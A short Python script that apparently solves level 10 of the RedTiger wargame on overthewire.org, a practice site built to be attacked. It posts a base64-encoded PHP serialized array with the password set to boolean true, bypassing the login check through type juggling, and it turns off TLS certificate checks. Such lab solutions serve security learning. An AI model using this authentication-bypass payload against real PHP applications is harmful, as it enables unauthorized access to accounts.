import requests
import base64

url = "https://redtiger.labs.overthewire.org/level10.php"
cookies = {
    "level10login":"whatever_just_a_fresh_password"
}

query = 'a:2:{s:8:"username";s:9:"TheMaster";s:8:"password";b:1;}'
query = str.encode(query)
query = base64.b64encode(query)
query = query.decode("utf-8")
payload = {
    'login':query,
    'dologin':'Login'
}
print(payload)

req = requests.post(url, cookies=cookies, verify=False, data=payload)
print(req.text)

